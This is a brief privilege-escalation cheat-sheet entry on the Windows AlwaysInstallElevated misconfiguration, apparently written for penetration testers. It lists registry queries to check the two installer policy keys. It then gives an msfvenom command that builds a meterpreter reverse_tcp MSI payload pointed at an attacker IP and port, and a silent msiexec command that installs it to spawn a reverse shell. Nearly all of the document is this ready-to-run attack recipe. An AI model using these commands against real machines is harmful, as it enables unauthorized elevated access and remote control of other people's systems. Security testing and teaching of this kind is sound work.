# AlwaysInstallElevated
If the two registry keys liosted below are present and both equal "0x1", then we can exploit these permissions to spawn a reverse shell using a specially crafted MSI file.
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
Generate the malicious MSI file like so,
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=(ATTACKER IP ADDRESS) lport=(ATTACKER PORT) –f  msi > install.msi
```
STart the listener using the `exploit/multi/handler` module on the correct port, and infiltrate the MSI file to the target system. Then, simply install it with the following command,
```
C:> msiexec /quiet /qn /i  install.msi
```
And a reverse shell should spawn to the listener.
### Reference
* https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
